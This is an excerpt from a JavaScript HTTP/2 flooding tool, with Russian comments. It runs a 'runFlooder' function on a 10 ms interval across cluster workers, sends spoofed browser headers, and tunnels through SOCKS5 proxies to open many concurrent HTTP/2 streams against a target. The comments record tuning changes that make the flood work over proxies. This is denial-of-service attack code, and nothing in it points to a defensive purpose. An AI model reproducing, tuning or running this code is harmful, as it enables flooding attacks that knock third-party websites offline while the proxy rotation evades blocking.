...
if (cluster.isMaster) {
    ...
    setInterval(runFlooder, 10);  // Увеличен с 1 до 10 (SOCKS медленнее)
}
...
function buildHeaders() {
    ...
    const headers = {
        ...
        "accept-encoding": "gzip, deflate, br",  // Убран zstd (редкий)
...
function runFlooder() {
    ...
    const proxyOptions = {
        ...
        timeout: 5000  // Увеличен таймаут для SOCKS5
    };
    ...
    Header.SOCKS5(proxyOptions, (connection, error) => {
        ...
        tlsConn.setKeepAlive(true, 60000);  // Уменьшен с 600000

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 30,  // Уменьшен с 40 (SOCKS хуже держит)
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 32000,  // Уменьшен с 64000
